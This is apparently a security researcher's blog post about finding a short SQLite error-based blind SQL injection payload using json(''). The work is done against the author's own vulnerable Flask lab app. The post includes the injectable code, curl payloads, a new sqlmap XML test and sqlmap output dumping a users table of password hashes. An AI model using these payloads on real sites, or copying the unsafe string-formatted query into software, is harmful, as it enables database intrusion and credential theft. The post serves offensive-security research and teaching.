---
title: Implement a Blind Error-Based SQLMap payload for SQLite
date: 2023-08-24
categories: [ "Web Exploitation" ]
tags: [ "research", "sqlmap", "sql injection" ]     # TAG names should always be lowercase
---

## Context

Back to 2019, my first HackTheBox box `Intense` was released with several steps involved:

- exploit a SQL injection for SQLite DBMS on the web application
- use a hash length extension attack to login as admin on the web application
- leak the SNMP config through a file disclure to get a shell on the underlying server
- exploit an ELF binary to gain root access to the box

The goal of this post is not to make a write-up of the box but to focus on the SQL injection part and how we can easily create new SQLMap payloads.

## The SQL Injection

When I created this challenge, I had in mind that the SQL injection should not be trivial and gets people to think about a new payload. So of course, SQLMap doesn’t work as its payloads are quite long.


Here is the vulnerability in the Flask application:

```python
@app.route("/submitmessage", methods=["POST"])
def submitmessage():
    message = request.form.get("message", '')
    if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
    # insert new message in DB
    try:
        query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
        return str(e)
    return "OK"
```

The check on the message length was to limit users to use time-based SQL injection (spoiler alert: it didn’t work).

As the goal of the blog post is to find a new payload which is more efficient than payload based on time, I removed the length check for the coming tests to help SQLMap.

Now if we run SQLMap, it should identify a time-based blind payload:

```bash
> python sqlmap.py -u http://127.0.0.1:5000/submitmessage --data 'message=a' -p 'message' --dbms=sqlite --level 5 --risk 3
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.8.8#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:10:17 /2023-08-24/

[13:10:17] [INFO] testing connection to the target URL
[13:10:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:10:17] [INFO] testing if the target URL content is stable
[13:10:18] [INFO] target URL content is stable
[13:10:18] [WARNING] heuristic (basic) test shows that POST parameter 'message' might not be injectable
[13:10:18] [INFO] testing for SQL injection on POST parameter 'message'
[13:10:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:10:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:10:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[...]
[13:10:31] [INFO] POST parameter 'message' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable
[...]
```

## Exploitation strategy

SQL injections in INSERT clause are often error-based but to my knowledge, there is no SQLite function, by default, that allows us to leak raw information through an exception/error.

When we submit a message on the web application, the string “OK” is returned when the message has been successfuly inserted or an exception is raised if an error occured:

```bash
> curl http://127.0.0.1:5000/submitmessage --data "message="
OK%

> curl http://127.0.0.1:5000/submitmessage --data "message='"
unrecognized token: "''')"%
```

Basic blind SQL payloads don’t work here:

```bash
> curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and 1=1 and 'a'='a"
OK%

> curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and 1=2 and 'a'='a"
OK%
```

Our approach is to find a SQLite function that triggers one of the following behaviour:

- servers returns the error in the header/body page
- HTTP 500 status code


The core of the injection will look like:

```
' and case when 1=2 then 1 else function_to_find(xxx) end and 'a'='a -> ERROR
```

## Find the right function

We will use two things:

- SQLite documentation
- SQLite interpreter, sqlite3 in my Linux system


SQLite has several core functions that you can find in the documentation. We may want to look for “logic vulnerable” functions/clause that compute integer:

- pow, exp may create an integer overflow
- division by 0 may create an error


However, if we try them in the SQLite interpreter none of them raise an error:

```
sqlite> select pow(999999,999999999999);
Inf
sqlite> select exp(99999999);
Inf
sqlite> select 1/0;

sqlite>
```


A solution is to look at every function and check what the doc says or by CTRL+F keywords such as `error`, `exception`, `raise`.


Four years ago, I came up using the function `load_extension()` that loads a library (.so, .dll) on the disk. By default, loading extension is disabled and the function throws an error.


On the interpreter

```
sqlite> select load_extension(0);
Runtime error: 0.so: cannot open shared object file: No such file or directory
```

On the application

```bash
> curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and load_extension(0) and 'a'='a"
not authorized%
```

And today, I looked back at the documentation if I could find other functions and decrease my SQLi payload length.


In the math functions section, I noticed the `abs` function and the documentation says the function raises an integer overflow error if the integer argument is equal to `-9223372036854775808`.

```
sqlite> select abs(-9223372036854775808);
Runtime error: integer overflow
```

In the json section, the documentation says that every json functions raise an error if the text value is not a well-formed JSON object. Quite similar to the `UPDATEXML` or `EXTRACTVALUE` MySQL functions.

```
sqlite> select json('');
Runtime error: malformed JSON
```

## Exploitation

Using `load_extension` or `abs` is possible but `json` function is the shortest.

| Function | Length |
|---------------------------|----------------|
| load_extension(0)         | 17             |
| abs(-9223372036854775808) | 25             |
| json('')                  | 8              |


Our payload is the following:

```
' and case when 1=2 then 1 else json('') end and 'a'='a
```

And the result:

```
> curl http://127.0.0.1:5000/submitmessage --data "message=' and case when 1=1 then 1 else json('') end and 'a'='a"         
OK%
```

```
> curl http://127.0.0.1:5000/submitmessage --data "message=' and case when 1=2 then 1 else json('') end and 'a'='a"
malformed JSON%
```


## Implement our new payload in SQLMap

Now we have a working and efficient payload, we can implement it in SQLMap:

```
> git clone https://github.com/sqlmapproject/sqlmap
> cd sqlmap
```


Add the following at the end of the file `data/xml/payloads/boolean_blind.xml`:

```xml
<test>
    <title>SQLite boolean-based blind</title>
    <stype>1</stype> <!-- Injection type (Boolean, Error-based, ...) -->
    <level>1</level> <!-- When the test should be performed (1=Always) -->
    <risk>1</risk> <!-- Damage risk of the payload -->
    <clause>1</clause> <!-- Clause to inject (WHERE, GROUP BY, ...) -->
    <where>1</where> <!-- Where the payload should be inserted -->
    <!-- [INFERENCE] SQLMap will insert the payload to extract data -->
    <vector>AND CASE WHEN [INFERENCE] THEN 1 ELSE json('') END </vector> 
    <request>
    <!-- Check for the vuln, should return 1 -->
        <payload>AND CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE json('') END</payload> 
    </request>
    <response>
        <!-- 2nd check for the vuln, should raise the error -->
        <comparison>AND CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE json('') END</comparison>
    </response>
    <details>
        <dbms>SQLite</dbms>
    </details>
</test>
```

If we run SQLMap it should find the injection:

```bash
> python sqlmap.py -u http://127.0.0.1:5000/submitmessage --data 'message=a' -p 'message' --dbms=sqlite

[...]

[13:18:56] [INFO] testing connection to the target URL
[13:18:56] [INFO] testing if the target URL content is stable
[13:18:56] [INFO] target URL content is stable
[13:18:56] [WARNING] heuristic (basic) test shows that POST parameter 'message' might not be injectable
[13:18:56] [INFO] testing for SQL injection on POST parameter 'message'
[13:18:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:18:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:18:56] [INFO] testing 'Generic inline queries'
[13:18:56] [INFO] testing 'SQLite boolean-based blind'
[13:18:57] [INFO] POST parameter 'message' appears to be 'SQLite boolean-based blind' injectable 
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] n
[13:19:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:19:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:19:02] [INFO] checking if the injection point on POST parameter 'message' is a false positive
POST parameter 'message' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: message (POST)
    Type: boolean-based blind
    Title: SQLite boolean-based blind
    Payload: message=a' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND 'EDIB'='EDIB
```


As the new payload with the function `json` is shorter than my initial `load_extension` method, the length check in `app.py` can be put back and it still works.


Dump the tables:

```bash
> python sqlmap.py -u http://127.0.0.1:5000/submitmessage --data 'message=a' -p 'message' --dbms=sqlite --tables

[...]

sqlmap resumed the following injection point(s) from stored session:
---                                                   
Parameter: message (POST)                                                                                              
    Type: boolean-based blind
    Title: SQLite boolean-based blind
    Payload: message=a' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND 'EDIB'='EDIB
---                                  
[13:20:44] [INFO] testing SQLite                                                                                       
[13:20:44] [INFO] confirming SQLite
[13:20:44] [INFO] actively fingerprinting SQLite
[13:20:44] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite                           
[13:20:44] [INFO] fetching tables for database: 'SQLite_masterdb'
[13:20:44] [INFO] fetching number of tables for database 'SQLite_masterdb'
[13:20:44] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:20:44] [INFO] retrieved: 2                                                                                         
[13:20:44] [INFO] retrieved: users                  
[13:20:44] [INFO] retrieved: messages                                                                                  
<current>                     
[2 tables]                    
+----------+                                                                                                           
| messages |                      
| users    |                  
+----------+
```

Dump data from the users table:

```bash
> python sqlmap.py -u http://127.0.0.1:5000/submitmessage --data 'message=a' -p 'message' --dbms=sqlite -T users --dump

[...]

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: message (POST)
    Type: boolean-based blind
    Title: SQLite boolean-based blind
    Payload: message=a' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND 'EDIB'='EDIB
---

[...]

[13:21:04] [INFO] retrieved: CREATE TABLE users(username varchar(20), secret varchar(200), role INT)
[13:21:06] [INFO] fetching entries for table 'users'
[13:21:06] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[13:21:06] [INFO] retrieved: 2
[13:21:06] [INFO] retrieved: 1
[13:21:06] [INFO] retrieved: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
[13:21:07] [INFO] retrieved: admin
[13:21:07] [INFO] retrieved: 0
[13:21:07] [INFO] retrieved: 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
[13:21:08] [INFO] retrieved: guest
[13:21:08] [INFO] recognized possible password hashes in column 'secret'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: <current>
Table: users
[2 entries]
+------+------------------------------------------------------------------+----------+
| role | secret                                                           | username |
+------+------------------------------------------------------------------+----------+
| 1    | f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 | admin    |
| 0    | 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec | guest    |
+------+------------------------------------------------------------------+----------+
```

The Pull Request can be found here: [Add SQLite AND boolean-based blind payload.](https://github.com/sqlmapproject/sqlmap/pull/5501)